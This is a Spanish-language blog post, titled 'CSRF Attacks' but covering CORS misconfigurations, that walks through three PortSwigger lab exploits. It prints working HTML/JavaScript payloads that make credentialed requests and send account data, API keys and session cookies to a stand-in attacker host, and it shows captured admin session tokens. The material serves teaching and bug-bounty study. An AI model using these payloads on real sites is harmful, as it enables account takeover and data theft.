---
layout: post
title:  "CSRF Attacks"
author: erik
categories: [ Web ]
image: https://user-images.githubusercontent.com/47476901/170120828-3edcc859-fc45-42c3-9fe7-a8cd8b20f682.png
beforetoc: ""
toc: false
tags: [ Web, Bug Bounty, Payloads ]
---
- El uso compartido de recursos entre orígenes (CORS) es un mecanismo del navegador que permite el acceso controlado a recursos fuera de un dominio determinado.
- Amplía y añade flexibilidad a la política del mismo origen (SOP).
- Sin embargo, también ofrece la posibilidad de ataques entre dominios si la política CORS de un sitio web está mal configurada e implementada.

#### 1- CORS vuln con basico Origin reflejado
Podemos ver que el resultado de los datos se ven en la response. 

![CORSBASIC1](https://user-images.githubusercontent.com/47476901/170120840-b2ebc878-083c-4696-880d-4dd1a7c49f27.png)

Y el origin personalizado se refleja, lo cual nos indica que es vulnerable.
`Origin: http://web-prueba.com` ✔

![CORSBASIC2](https://user-images.githubusercontent.com/47476901/170120866-d6794c07-b894-479c-a4ac-05e7fd3c8f68.png)

Nos creamos un html personalizado para que esos datos se manden a nuestra pagina maliciosa para robar estos datos
![CORSBASIC-webmaliciosa](https://user-images.githubusercontent.com/47476901/170120906-757459e0-d8c5-46dc-afab-980136ef0bbe.png)


- HTML web maliciosa: 
```html
<html>
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://web.com/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
	location='https://evil-web.com/log?key='+this.responseText;
};
</script>
</html>
```

Cuando el usuario visita nuestra pagina eviará los datos de ese endpoint a nuestra pagina donde se podran ver en los logs de nuestro servidor.

![CORSBASIC-LOGS](https://user-images.githubusercontent.com/47476901/170120986-ebb2f1d4-eb13-4f16-96fc-93a70433d67c.png)

---

#### 2- Origin solo permite origines nulos
Cuando modificamos el Origin no se refleja en la request
`Origin: http://web-prueba.com` ❌

![CORS-NULL-noserefleja](https://user-images.githubusercontent.com/47476901/170121022-62f66786-5ea7-4c02-8714-1c60d2382fcd.png)

Podemos ver que la web solo permitre Origins que sean nulos.
`Origin: null` ✔

![CORS-NULL-nullserefleja](https://user-images.githubusercontent.com/47476901/170121051-0e387fd5-1f4d-4ca7-b1bc-d88df606e7a1.png)

- Un atacante puede usar varios trucos para generar una solicitud de origen cruzado que contenga el valor `NULL` en el encabezado Origin.
- Esto satisfará la lista blanca, lo que conducirá al acceso entre dominios. Por ejemplo, esto se puede hacer mediante una `iframe` solicitud de origen cruzado en espacio aislado del formulario:

- HTML web maliciosa: 
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
	<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener; 
        req.open('get','https://web.com/accountDetails',true); 
        req.withCredentials = true;
        req.send();
		function reqListener() {
		location='https://evil-web.com/log?key='+this.responseText; }; 
    </script>
">
</iframe>
```
Con el `location` estamos indicando que esa respuesta que tiene los datos sensibles se manden como parametros a la pagina del atacante.
Esta es la request que hace el usuario victima por detras al visitar nuestra pagina

1- Visita la pagina atacante y ejecuta el script de javascript que hemos creado

![CORS-NULL-1](https://user-images.githubusercontent.com/47476901/170121075-ea6d19f6-6e26-4833-abf3-19c747a51f71.png)

2- Y cuando lee el location manda los datos

![CORS-NULL-2](https://user-images.githubusercontent.com/47476901/170121090-d15e2f6c-c45e-4e17-888e-f4b58605e167.png)

3- Cuando el usuario visita nuestra pagina eviará los datos de ese endpoint a nuestra pagina donde se podran ver en los logs de nuestro servidor.
Logs servidor: 

![CORS-NULL-3](https://user-images.githubusercontent.com/47476901/170121110-e824ffa6-1f99-4b62-9471-5a9ff468ccb0.png)


Url Decode: 
Tenemos:
Usuario, email, apikey y la sesion (La cookie que esta vinculada al usuario)

![CORS-NULL-urldecode](https://user-images.githubusercontent.com/47476901/170121138-e73bbef4-d56f-403f-b113-d11413a54beb.png)


**Exfiltrando datos administrador**
Ahora imagina que el administrador visita nuestra pagina, nos llega sus datos y en esos datos se incluye la cookie de session que podemos usar para entrar a su sesion
Logs servidor: 

![CORS-NULL-admin1](https://user-images.githubusercontent.com/47476901/170121188-142730ff-0f1b-4638-ae4d-618fc2ee910c.png)

Url Decode: 

![CORS-NULL-admin2](https://user-images.githubusercontent.com/47476901/170121205-6b456e81-74be-4d67-8422-cde3949111f7.png)

Ya tenemos la sesion del administrador
`Admin Session: F1BVIVSoQvTaB8i6HJ25gxtJdvJKweuz`

![CORS-NULL-admin3](https://user-images.githubusercontent.com/47476901/170121229-5dc14a73-74f3-4d81-bebd-816a5bf6c253.png)

#### 3- CORS con protocolos inseguros confiables

La web solo confia en dominios que pertenecen a ella, es decir sus subdominios.

Hacemos una prueba con nuestra web en el origin y no obtenemos reflejo.
`Origin: http://web-prueba.com` ❌

![CORS-SUBDOMAIN1](https://user-images.githubusercontent.com/47476901/170121254-7e6c7df8-4e4e-4e49-8738-b2d4873d2087.png)


Probamos con un subdominio y se refleja.
`Origin: http://subdomain.web.com` ✔

![CORS-SUBDOMAIN2](https://user-images.githubusercontent.com/47476901/170121281-a1b04963-fea1-4c9a-a434-7257df905382.png)

Encontramos un subdominio

![CORS-SUBDOMAIN3](https://user-images.githubusercontent.com/47476901/170121326-6bf2936e-ecee-4043-b83d-64473fe62467.png)


Este subdomino es vulnerable a XSS reflected en los parametros productId, esto nos servirá para ejecutar nuestro script ya que la pagina solo confia en sus subdominios.

**XSS en subdominio**

![CORS-SUBDOMAIN-XSS](https://user-images.githubusercontent.com/47476901/170121381-2735c975-9520-407e-a8b7-626497e0f292.png)


Aprovechamos esta vulnerabilidad para explotar la confianza entre dominios y asi poder exfiltrar los datos a nuestro servidor.

**Nuestra web maliciosa**
- HTML web maliciosa: 
```html
<html>
<script>
    document.location="http://subdomain.web.com/?search=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://web.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://evil-web.com/log?key='%2b%this.responseText; };%3c/script>"
</script>
</html>
```

Cuando el usuario victima visite nuestra pagina ejecutará la XSS  del subdomino que contiene el script que realiza una peticion a la pagina vulnerable a cors por confianza de dominios y la response de esa peticion nos la envia a los logs de nuestro servidor.

1-  El usuario visita nuestra pagina maliciosa que contiene el script principal

![CORS-SUBDOMAIN-FINAL1](https://user-images.githubusercontent.com/47476901/170121414-3e0c1072-7b3c-41a8-9ebf-53cd154e076b.png)

2- Se ejecuta el javascript y manda al usuario al subdomino y ejecuta la xss 

![CORS-SUBDOMAIN-FINAL2](https://user-images.githubusercontent.com/47476901/170121446-25a24085-5afc-4a5f-80a7-5931856223f5.png)

3- Como el script procede de un domino de confianza configurado por el cors de la pagina final, se ejecuta en la pagina vulnerable a CORS.

![CORS-SUBDOMAIN-FINAL3](https://user-images.githubusercontent.com/47476901/170121465-a3fdcf2b-361e-47e8-89e3-6e40540281e6.png)

4- Como era malicioso, por detrás se ha mandado la response al servidor del atacante con todos los datos sensibles.
Finalmente se envian los datos a la pagina maliciosa como podemos ver con esta request interceptada

![CORS-SUBDOMAIN-FINAL4](https://user-images.githubusercontent.com/47476901/170121479-4fc4ed61-f871-47ef-b710-f461414e9d7c.png)

5- Esos datos se guardan en los logs de nuestra pagina como atacante.
En el que en este caso se envian username, email, apikey y cookie de sesion 

![CORS-SUBDOMAIN-FINAL5](https://user-images.githubusercontent.com/47476901/170121493-bb8947d1-376c-4577-a46b-6cdd3dd2f74b.png)

6- En el caso mas extremo como hemos explicado antes, si un administrador visita nuestra pagina tendremos su cookie de sesion.

![CORS-SUBDOMAIN-FINAL6](https://user-images.githubusercontent.com/47476901/170121516-5ed34f0c-f1c5-4a33-96d0-434b95629d6a.png)

7- Usando la cookie de sesion del administrador 
`Admin Session: clljARot4Lc4KkFHfIylENGZmZbzYwD7`

![CORS-SUBDOMAIN-FINAL7](https://user-images.githubusercontent.com/47476901/170121537-f506411d-2b99-4407-b9c2-75553ea3666c.png)

### Conclusión
- Esto depende siempre de la response al endpoint que apuntemos.
- En este ejemplo si se mandaba la cookie de sesion del usuario o el email, pero este es un caso muy extremo porque las webs son muy diferentes entre sí, com o dice el punto de arriba, todo depende de la response del endpoint. 
- Entender que relaciones de confianzas se manejan en las politicas CORS ya que puede ser que exista una vulnerabilidad CORS pero no tiene porque ser ofensiva. Como todo, depede del contexto.

Source Labs:
- [Portswigger Labs](https://portswigger.net/web-security)

